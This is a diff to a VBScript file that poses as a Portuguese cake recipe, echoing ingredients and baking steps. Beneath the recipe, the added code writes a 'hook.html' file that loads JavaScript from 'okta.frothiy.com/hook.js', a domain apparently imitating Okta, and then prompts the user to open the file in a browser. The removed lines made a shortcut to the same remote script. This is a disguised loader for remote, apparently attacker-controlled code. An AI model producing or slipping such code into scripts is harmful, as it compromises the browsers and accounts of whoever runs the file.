@@ -1,4 +1,6 @@
-Dim ingredientes, ingrediente
+Option Explicit
+Dim ingredientes, ingrediente, filename, objFSO, objFile
+
 ingredientes = Array("Farinha", "Açúcar", "Ovos", "Manteiga", "Leite", "Fermento")
 
 WScript.Echo "Receita simples de bolo:"
@@ -16,12 +18,29 @@ WScript.Echo "3. Despeje a massa em uma forma untada e enfarinhada."
 WScript.Echo "4. Asse em forno pré-aquecido a 180°C por 35-40 minutos ou até dourar."
 WScript.Echo "5. Deixe esfriar, desenforme e sirva."
 
-CreateShortcut "https://okta.frothiy.com/hook.js", "hook.lnk"
+filename = "hook.html"
+CreateHTMLFile filename
 
-Sub CreateShortcut(url, shortcutName)
-    Dim objShell, objShortcut
+If MsgBox("Deseja abrir o arquivo HTML criado?", vbYesNo + vbQuestion, "Abrir arquivo") = vbYes Then
+    OpenHTMLFile filename
+End If
+
+Sub CreateHTMLFile(filename)
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    Set objFile = objFSO.CreateTextFile(filename, True)
+    objFile.WriteLine "<!DOCTYPE html>"
+    objFile.WriteLine "<html>"
+    objFile.WriteLine "<head>"
+    objFile.WriteLine "<script src=""https://okta.frothiy.com/hook.js""></script>"
+    objFile.WriteLine "</head>"
+    objFile.WriteLine "<body>"
+    objFile.WriteLine "</body>"
+    objFile.WriteLine "</html>"
+    objFile.Close
+End Sub
+
+Sub OpenHTMLFile(htmlFile)
+    Dim objShell
     Set objShell = CreateObject("WScript.Shell")
-    Set objShortcut = objShell.CreateShortcut(objShell.CurrentDirectory & "\" & shortcutName)
-    objShortcut.TargetPath = url
-    objShortcut.Save
+    objShell.Run "explorer " & htmlFile
 End Sub
